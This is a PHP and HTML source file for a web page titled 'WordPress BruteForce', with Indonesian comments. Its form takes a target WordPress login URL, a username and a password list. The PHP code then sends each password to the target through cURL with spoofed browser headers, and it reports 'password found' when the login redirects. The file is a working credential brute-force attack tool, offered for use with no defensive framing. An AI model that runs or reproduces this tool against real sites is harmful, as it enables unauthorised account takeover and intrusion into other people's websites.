<!DOCTYPE html>
<html lang="en">
<!-- 
    Author : Muhammad Razan Rizqullah
    


 -->

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WordPress BruteForce</title>
    <!-- link bootstrap css -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
    <!-- Ikon CSS bootstrap -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.4/font/bootstrap-icons.css">
    <style>
        footer {
            font-color: white;
        }
    </style>
</head>

<body class="bg-dark">
    <header class="fixed-top mb-5">
        <nav class="navbar bg-success">
            <div class="container-fluid">
                <a class="navbar-brand text-white" href="#">
                    <img src="hacker.png" alt="Logo" width="30" height="24" class="d-inline-block align-text-top">
                    WordPress BruteForce
                </a>
            </div>
        </nav>
    </header>
    <main class="bg-dark mt-5">
        <div class="container-fluid mt-5 px-auto mx-auto h-100 position-relative">
            <form method="POST" action="">
                <div class="container-fluid mb-3 mx-auto d-inline-block justify-content-center">
                    <label for="basic-url" class="form-label">URL Target</label>
                    <div class="input-group mx-auto">
                        <span class="input-group-text" id="basic-addon3">https://contoh.com/wp-login.php</span>
                        <input type="text" name="link_target" class="form-control" id="basic-url" aria-describedby="basic-addon3 basic-addon4" required>
                    </div>
                    <div class="form-text" id="basic-addon4">Example help text goes outside the input group.</div>
                </div>

                <div class="input-group mb-3">
                    <input type="text" class="form-control" name="username" placeholder="Username ex : admin" aria-label="Username ex : admin" required>
                </div>

                <div class="input-group">
                    <span class="input-group-text">masukkan list password</span>
                    <textarea class="form-control" name="password" aria-label="With textarea"></textarea>
                </div>
                <div class="container-fluid justify-content-center mt-5 text-center">
                    <button type="submit" name="bruteforce" class="btn btn-warning mx-5 text-center w-50" placeholder="Bruteforce">BruteForce</button>
                </div>

        </div>
        </form>
        <!-- logaritma bruteforce -->
        <?php
        // jika menekan tombol bruteforce
        // maka lakukan aksi ini

        if (isset($_POST["bruteforce"])) {
            // deklarasi variabel unsur login
            $target = $_POST['link_target'];
            $user = $_POST['username'];
            // mengubah inputan berspasi menjadi array
            // $pass = explode("\n", $_POST['password']);
            $pass = explode("\n", $_POST['password']);
            // aksi mengecek apakah list password sudah terinput
            if ($pass) {
                foreach ($pass as $pwkorban) {

                    // program untuk melakukan curl informasi Login
                    $url = $target;
                    $parse = parse_url($url);
                    $domain = $parse['scheme'] . '://' . $parse['host'] . '/';

                    $data = array(
                        'log' => $user,
                        'pwd' => $pwkorban,
                        'wp-submit' => 'Log Masuk',
                        'redirect_to' => $domain . 'wp-admin',
                        'testcookie' => '1'
                    );

                    $cookie_file = getcwd() . '/cookiestarget.txt';

                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
                    $headers = array(
                        'Content-Type: application/x-www-form-urlencoded',
                        'Cache-Control: max-age=0',
                        'Connection: close',
                        'Cookie: wp-settings-time-1=1681046829; wordpress_test_cookie=WP%20Cookie%20check',
                        'Origin: ' . $domain,
                        'Referer:' . $domain . 'wp-login.php?redirect_to=' . $domain . '%2Fwp-admin%2F&reauth=1',
                        'Sec-Fetch-Dest: document',
                        'Sec-Fetch-Mode: navigate',
                        'Sec-Fetch-Site: same-origin',
                        'Sec-Fetch-User: ?1',
                        'Upgrade-Insecure-Requests: 1',
                        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36'
                    );
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

                    $jawaban = curl_exec($ch);

                    // Tampilkan kode status HTTP
                    // echo "HTTP response code: " . curl_getinfo($ch, CURLINFO_HTTP_CODE) . "\n";
                    // echo "terjadi operasi di file " . curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
                    $banding = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);

                    if ($banding !== $target) {
                        echo '<p class="text-success fw-bold">password ditemukan :' . $pwkorban . '</p>';
                    } else {
                        echo '<p class="text-danger fw-bold">password salah :' . $pwkorban . '</p>';
                    }

                    curl_close($ch);
                }
            }
        }
        ?>

    </main>
    <footer class="fixed-bottom bg-success">
        <div class="container-fluid">
            <div class="col-md-4 d-flex align-items-center float-start">
                <a href="/" class="mb-3 me-2 mb-md-0 text-body-secondary text-decoration-none lh-1">
                    <svg class="bi" width="30" height="24">
                        <use xlink:href="#bootstrap" />
                    </svg>
                </a>
                <span class="mb-3 mb-md-0 text-light">&copy; 2023 BIN, Uchiha obITo</span>
            </div>

            <ul class="nav col-md-4 justify-content-end text-end float-end list-unstyled d-flex">
                <li class="ms-3"><a class="text-light" href="#"><i class="bi bi-whatsapp"></i></a></li>
                <li class="ms-3"><a class="text-light" href="#"><i class="bi bi-instagram"></i></a></li>
                <li class="ms-3"><a class="text-light" href="#"><i class="bi bi-facebook"></i></a></li>
            </ul>
        </div>

    </footer>
</body>
<!-- link javscript bootstrap -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script>

</html>